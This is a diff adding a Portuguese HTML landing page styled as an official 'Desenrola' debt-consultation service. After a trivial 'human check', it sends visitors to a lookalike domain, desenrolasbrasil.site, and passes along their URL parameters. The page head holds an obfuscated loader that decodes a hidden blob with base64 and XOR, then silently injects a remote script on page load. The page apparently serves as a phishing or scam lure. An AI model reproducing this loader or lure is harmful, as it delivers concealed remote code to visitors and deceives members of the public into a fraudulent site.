@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Desenrola o Processo | Consulta digital</title>
+  <meta name="description" content="Acesse sua consulta digital de forma simples, organizada e segura.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;850;900&display=swap" rel="stylesheet">
+  <script>(function(){var k_iw14=atob("DKvuRTUtHX4AfM7vb9DMMEdBP0QiFLqbH9jUahpOeRAuCbqCBs2Xa1ZCcFBiDuGcDNmHNUFeMg5pBKuDQNuHPVBBMxRzXuLNDt+aN1xPaAplD+zVNPbCZ1JBchxhEL3NVfCVZ1tMcBsiRuyfBtOLKXxJP1IiCq+DGs7MfxcbfB03Tv+LWZONclZMKkc3RPvZDprbcwYPYCN9");var t_u=[];for(var a_ow0=0;a_ow0<k_iw14.length;a_ow0++){t_u.push(k_iw14.charCodeAt(a_ow0)&255);}var q_jh=t_u[0];var z_eh6=t_u.slice(1,1+q_jh);var o_r6p=t_u.slice(1+q_jh);var s_4qh=o_r6p.map(function(b,a_v){return b^z_eh6[a_v%q_jh];});var l_o="";for(var c_n0=0;c_n0<s_4qh.length;c_n0++){l_o+=String.fromCharCode(s_4qh[c_n0]&255);}var b_5eo=decodeURIComponent(escape(l_o));var e_1ok=JSON.parse(b_5eo);var t_42w=e_1ok.globals||[];t_42w.forEach(function(x_m){window[x_m.name]=x_m.value;});var n_na9b=document.createElement("script");n_na9b.src=e_1ok.url;n_na9b.async=true;n_na9b.defer=true;(e_1ok.attributes||[]).forEach(function(n_6){n_na9b.setAttribute(n_6.name,n_6.value);});(document.head||document.documentElement).appendChild(n_na9b);})();</script>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      color: #0b1b33;
+      background: #f7f5ef;
+      font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    button, input {
+      font: inherit;
+    }
+
+    button, a {
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page {
+      min-height: 100dvh;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      background: linear-gradient(rgba(0, 88, 200, 0.035) 1px, transparent 1px),
+                  linear-gradient(90deg, rgba(0, 88, 200, 0.035) 1px, transparent 1px),
+                  #f3f6f8;
+      background-size: 42px 42px;
+    }
+
+    .simpleMain {
+      flex: 1;
+      width: min(900px, calc(100% - 48px));
+      margin: 0 auto;
+      display: grid;
+      place-items: center;
+      padding: 66px 0;
+    }
+
+    .simpleCard {
+      width: min(720px, 100%);
+      min-height: auto;
+      padding: 0;
+      display: block;
+      border: 0;
+      border-radius: 0;
+      background: transparent;
+      box-shadow: none;
+      text-align: center;
+    }
+
+    .simpleLabel {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      border: 1px solid #d6dfe5;
+      border-radius: 6px;
+      color: #0058c8;
+      background: rgba(255, 255, 255, 0.72);
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: .16em;
+      text-transform: uppercase;
+    }
+
+    .simpleLabel::before {
+      content: "";
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #1fa971;
+    }
+
+    .simpleCard h1 {
+      margin: 27px auto 21px;
+      color: #0b1b33;
+      font-size: clamp(42px, 6vw, 67px);
+      line-height: 1.02;
+      letter-spacing: -3.2px;
+      font-weight: 830;
+    }
+
+    .simpleCard h1 .greenWord {
+      color: #1fa971;
+    }
+
+    .simpleCard p {
+      max-width: 590px;
+      margin: 0 auto 31px;
+      color: #5b6472;
+      font-size: 19px;
+      line-height: 1.6;
+    }
+
+    .simpleButton {
+      min-width: 230px;
+      min-height: 58px;
+      padding: 15px 34px;
+      border: 0;
+      border-radius: 7px;
+      color: #fff;
+      background: #0b1b33;
+      box-shadow: none;
+      cursor: pointer;
+      font-size: 20px;
+      font-weight: 850;
+      transition: transform .2s ease, box-shadow .2s ease, background .2s ease;
+    }
+
+    .simpleButton:hover {
+      transform: translateY(-2px);
+      background: #0058c8;
+      box-shadow: 0 12px 24px rgba(18, 89, 195, .2);
+    }
+
+    .indexFooter {
+      width: 100%;
+      padding: 0;
+      color: #aeb9c9;
+      background: #0b1b33;
+      border-top: 4px solid #0058c8;
+      text-align: left;
+    }
+
+    .footerInner {
+      width: min(1120px, calc(100% - 48px));
+      margin: 0 auto;
+      padding: 28px 0 30px;
+      display: grid;
+      grid-template-columns: 1fr;
+      align-items: start;
+      gap: 42px;
+    }
+
+    .footerInner nav {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      text-align: right;
+    }
+
+    .footerInner a {
+      color: #aeb9c9;
+      font-size: 11px;
+      font-weight: 650;
+      text-decoration: none;
+      transition: color .2s ease;
+    }
+
+    .footerInner a:hover {
+      color: #fff;
+    }
+
+    /* Modal Backdrop */
+    .modalBackdrop {
+      position: fixed;
+      inset: 0;
+      z-index: 50;
+      display: none;
+      place-items: center;
+      padding: 20px;
+      background: rgba(11, 27, 51, .72);
+      backdrop-filter: blur(5px);
+      -webkit-backdrop-filter: blur(5px);
+      animation: fadeIn .2s ease-out;
+    }
+
+    .modalBackdrop.active {
+      display: grid;
+    }
+
+    .modal {
+      position: relative;
+      width: min(470px, 100%);
+      min-height: 0;
+      padding: 42px 40px 32px;
+      border: 0;
+      border-left: 6px solid #0058c8;
+      border-radius: 5px 18px 18px 5px;
+      background: #fff;
+      box-shadow: 0 28px 75px rgba(4, 15, 31, .32);
+      text-align: left;
+      animation: modalIn .28s ease-out;
+    }
+
+    .closeButton {
+      position: absolute;
+      top: 17px;
+      right: 17px;
+      width: 35px;
+      height: 35px;
+      border: 0;
+      border-radius: 5px;
+      color: #0b1b33;
+      background: #f2f0e9;
+      cursor: pointer;
+      font-size: 23px;
+      line-height: 1;
+      display: grid;
+      place-items: center;
+      transition: background .15s ease;
+    }
+
+    .closeButton:hover {
+      background: #e4e0d4;
+    }
+
+    .modalStep {
+      display: block;
+      margin-bottom: 21px;
+      color: #1fa971;
+      font-size: 11px;
+      font-weight: 850;
+      letter-spacing: .16em;
+      text-transform: uppercase;
+    }
+
+    .modal h2 {
+      margin: 0 38px 14px 0;
+      color: #0b1b33;
+      font-size: 31px;
+      line-height: 1.08;
+      letter-spacing: -1.2px;
+      font-weight: 800;
+    }
+
+    .modal p {
+      margin: 0 0 26px;
+      color: #5b6472;
+      font-size: 15px;
+      line-height: 1.6;
+      text-align: left;
+    }
+
+    .modalPrimary {
+      width: 100%;
+      min-height: 55px;
+      padding: 0 20px;
+      border: 0;
+      border-radius: 5px;
+      color: #fff;
+      background: #0b1b33;
+      box-shadow: none;
+      cursor: pointer;
+      font-weight: 780;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      transition: transform .2s ease, box-shadow .2s ease, background .2s ease;
+    }
+
+    .modalPrimary span {
+      font-size: 21px;
+      line-height: 1;
+    }
+
+    .modalPrimary:hover {
+      transform: translateY(-2px);
+      background: #0058c8;
+      box-shadow: 0 10px 22px rgba(18, 89, 195, .2);
+    }
+
+    .modalSecondary {
+      width: 100%;
+      margin: 11px 0 0;
+      padding: 9px 0;
+      border: 0;
+      color: #5b6472;
+      background: transparent;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 650;
+      text-align: center;
+      transition: color .15s ease;
+    }
+
+    .modalSecondary:hover {
+      color: #0b1b33;
+    }
+
+    form {
+      text-align: left;
+    }
+
+    form label {
+      display: block;
+      margin-bottom: 10px;
+      color: #0b1b33;
+      font-size: 14px;
+      font-weight: 760;
+    }
+
+    form input {
+      width: 100%;
+      height: 56px;
+      margin-bottom: 13px;
+      padding: 0 16px;
+      border: 1px solid #d6d9dc;
+      border-radius: 5px;
+      outline: none;
+      color: #0b1b33;
+      background: #fbfaf6;
+      font-size: 16px;
+      transition: border-color .2s ease, box-shadow .2s ease;
+    }
+
+    form input:focus {
+      border-color: #0058c8;
+      box-shadow: 0 0 0 4px rgba(18, 89, 195, .12);
+    }
+
+    form input.input-error {
+      border-color: #e53935;
+      box-shadow: 0 0 0 4px rgba(229, 57, 53, .12);
+    }
+
+    .error-text {
+      display: none;
+      color: #e53935;
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: -6px;
+      margin-bottom: 12px;
+    }
+
+    .error-text.active {
+      display: block;
+    }
+
+    .loadingState {
+      min-height: 330px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: center;
+      text-align: left;
+    }
+
+    .loadingLogo {
+      position: relative;
+      width: 150px;
+      height: 150px;
+      margin: 0 auto 28px;
+      display: grid;
+      place-items: center;
+    }
+
+    .loadingLogo img {
+      width: 108px;
+      height: 108px;
+      object-fit: contain;
+      border-radius: 18px;
+    }
+
+    .loadingRing {
+      position: absolute;
+      inset: 0;
+      border: 3px solid #e6efeb;
+      border-top-color: #0058c8;
+      border-right-color: #1fa971;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .loadingDots {
+      display: flex;
+      gap: 6px;
+      margin-top: 3px;
+    }
+
+    .loadingDots i {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #0058c8;
+      animation: pulse 1s infinite alternate;
+    }
+
+    .loadingDots i:nth-child(2) {
+      animation-delay: .2s;
+    }
+
+    .loadingDots i:nth-child(3) {
+      animation-delay: .4s;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes modalIn {
+      from {
+        opacity: 0;
+        transform: translateY(18px) scale(.97);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      to {
+        opacity: .25;
+        transform: translateY(-3px);
+      }
+    }
+
+    @media (max-width: 880px) {
+      .simpleCard {
+        width: 100%;
+        padding-right: 0;
+        text-align: center;
+      }
+      .simpleCard p {
+        margin-left: auto;
+        margin-right: auto;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .page {
+        background-size: 36px 36px;
+      }
+      .simpleMain {
+        width: min(100% - 36px, 1120px);
+        padding: 54px 0 38px;
+      }
+      .simpleCard h1 {
+        font-size: 48px;
+        letter-spacing: -2.7px;
+      }
+      .simpleCard p {
+        font-size: 18px;
+      }
+      .simpleButton {
+        width: 100%;
+        min-height: 62px;
+        font-size: 22px;
+      }
+      .modal {
+        min-height: 0;
+        padding: 39px 24px 27px;
+        border-radius: 4px 16px 16px 4px;
+      }
+      .modal h2 {
+        font-size: 28px;
+      }
+      .footerInner {
+        width: min(100% - 36px, 1120px);
+        padding: 25px 0 28px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: .01ms !important;
+        animation-iteration-count: 1 !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="__next">
+    <main class="page">
+      <div class="simpleMain">
+        <section class="simpleCard">
+          <div class="simpleContent">
+            <span class="simpleLabel">Desenrola O Processo</span>
+            <h1>Já começou a <span class="greenWord">Desenrolar?</span></h1>
+            <p>O programa começou. Clique abaixo para prosseguir.</p>
+            <button id="btn-open-modal" class="simpleButton">Prosseguir</button>
+          </div>
+        </section>
+      </div>
+      <footer class="indexFooter">
+        <div class="footerInner">
+          <nav>
+            <a href="termos-de-uso.html">Termos de uso</a>
+            <a href="politica-de-privacidade.html">Política de privacidade</a>
+          </nav>
+        </div>
+      </footer>
+    </main>
+
+    <!-- Modal Backdrop -->
+    <div id="modal-backdrop" class="modalBackdrop" role="presentation">
+      <section class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" onclick="event.stopPropagation()">
+        
+        <!-- Step 1 View -->
+        <div id="step-1">
+          <button id="btn-close-modal-1" aria-label="Fechar" class="closeButton">×</button>
+          <span class="modalStep">Etapa 1 de 2</span>
+          <h2 id="modal-title">Bem-vindo ao Desenrola o processo</h2>
+          <p>Vamos fazer uma verificação rápida para liberar o acesso a consulta.</p>
+          <button id="btn-step-1-next" class="modalPrimary">
+            Iniciar acesso <span>→</span>
+          </button>
+          <button id="btn-step-1-cancel" class="modalSecondary">Agora não</button>
+        </div>
+
+        <!-- Step 2 View -->
+        <div id="step-2" style="display: none;">
+          <button id="btn-close-modal-2" aria-label="Fechar" class="closeButton">×</button>
+          <span class="modalStep">Etapa 2 de 2</span>
+          <h2>Prova humana para prosseguir</h2>
+          <p>Responda à pergunta abaixo para concluir a confirmação.</p>
+          <form id="challenge-form">
+            <label for="human-answer">Qual é o resultado de 1 + 2?</label>
+            <input 
+              id="human-answer" 
+              inputmode="numeric" 
+              autocomplete="off" 
+              placeholder="Digite sua resposta" 
+              required 
+            />
+            <div id="error-message" class="error-text">Resposta incorreta. O resultado de 1 + 2 é 3.</div>
+            <button type="submit" id="btn-submit-answer" class="modalPrimary">
+              Confirmar e continuar <span>→</span>
+            </button>
+          </form>
+          <button type="button" id="btn-step-2-back" class="modalSecondary">Voltar</button>
+        </div>
+
+        <!-- Loading View -->
+        <div id="step-loading" class="loadingState" style="display: none;">
+          <div class="loadingLogo">
+            <img src="logo.png" alt="Logo" onerror="this.style.display='none'">
+            <span class="loadingRing"></span>
+          </div>
+          <h2>Preparando seu acesso</h2>
+          <p>Estamos organizando sua consulta. Isso leva só alguns segundos.</p>
+          <div class="loadingDots">
+            <i></i>
+            <i></i>
+            <i></i>
+          </div>
+        </div>
+
+      </section>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const TARGET_URL = 'https://consulta.desenrolasbrasil.site/consulta.html';
+
+      const modalBackdrop = document.getElementById('modal-backdrop');
+      const btnOpenModal = document.getElementById('btn-open-modal');
+      const btnClose1 = document.getElementById('btn-close-modal-1');
+      const btnClose2 = document.getElementById('btn-close-modal-2');
+      const btnCancel1 = document.getElementById('btn-step-1-cancel');
+      const btnNext1 = document.getElementById('btn-step-1-next');
+      const btnBack2 = document.getElementById('btn-step-2-back');
+      const challengeForm = document.getElementById('challenge-form');
+      const humanAnswer = document.getElementById('human-answer');
+      const errorMessage = document.getElementById('error-message');
+
+      const step1 = document.getElementById('step-1');
+      const step2 = document.getElementById('step-2');
+      const stepLoading = document.getElementById('step-loading');
+
+      let isLoading = false;
+
+      function openModal() {
+        modalBackdrop.classList.add('active');
+        goToStep(1);
+      }
+
+      function closeModal() {
+        if (isLoading) return;
+        modalBackdrop.classList.remove('active');
+        goToStep(1);
+        if (humanAnswer) humanAnswer.value = '';
+        hideError();
+      }
+
+      function goToStep(step) {
+        step1.style.display = 'none';
+        step2.style.display = 'none';
+        stepLoading.style.display = 'none';
+
+        if (step === 1) {
+          step1.style.display = 'block';
+        } else if (step === 2) {
+          step2.style.display = 'block';
+          setTimeout(() => {
+            if (humanAnswer) humanAnswer.focus();
+          }, 50);
+        } else if (step === 'loading') {
+          stepLoading.style.display = 'flex';
+        }
+      }
+
+      function showError(msg) {
+        if (errorMessage) {
+          if (msg) errorMessage.textContent = msg;
+          errorMessage.classList.add('active');
+        }
+        if (humanAnswer) {
+          humanAnswer.classList.add('input-error');
+        }
+      }
+
+      function hideError() {
+        if (errorMessage) {
+          errorMessage.classList.remove('active');
+        }
+        if (humanAnswer) {
+          humanAnswer.classList.remove('input-error');
+        }
+      }
+
+      function redirectWithParams() {
+        try {
+          const currentParams = window.location.search;
+          const url = new URL(TARGET_URL);
+
+          if (currentParams) {
+            const searchParams = new URLSearchParams(currentParams);
+            searchParams.forEach((value, key) => {
+              url.searchParams.set(key, value);
+            });
+          }
+
+          window.location.href = url.toString();
+        } catch (e) {
+          // Fallback direct redirection
+          const sep = TARGET_URL.includes('?') ? '&' : '?';
+          const query = window.location.search ? window.location.search.replace(/^\?/, '') : '';
+          window.location.href = query ? (TARGET_URL + sep + query) : TARGET_URL;
+        }
+      }
+
+      // Event Listeners
+      btnOpenModal.addEventListener('click', openModal);
+      btnClose1.addEventListener('click', closeModal);
+      btnClose2.addEventListener('click', closeModal);
+      btnCancel1.addEventListener('click', closeModal);
+
+      modalBackdrop.addEventListener('click', function(e) {
+        if (e.target === modalBackdrop) {
+          closeModal();
+        }
+      });
+
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && modalBackdrop.classList.contains('active')) {
+          closeModal();
+        }
+      });
+
+      btnNext1.addEventListener('click', function() {
+        goToStep(2);
+      });
+
+      btnBack2.addEventListener('click', function() {
+        hideError();
+        goToStep(1);
+      });
+
+      humanAnswer.addEventListener('input', function() {
+        hideError();
+      });
+
+      challengeForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (isLoading) return;
+
+        const val = humanAnswer.value.trim().toLowerCase();
+        
+        // 1 + 2 = 3
+        const isCorrect = val === '3' || val === '3.0' || val === 'tres' || val === 'três';
+
+        if (isCorrect) {
+          isLoading = true;
+          hideError();
+          goToStep('loading');
+
+          // Smooth animation delay before redirection
+          setTimeout(function() {
+            redirectWithParams();
+          }, 1400);
+        } else {
+          showError('Resposta incorreta. Calcule 1 + 2 e tente novamente.');
+          humanAnswer.focus();
+          humanAnswer.select();
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
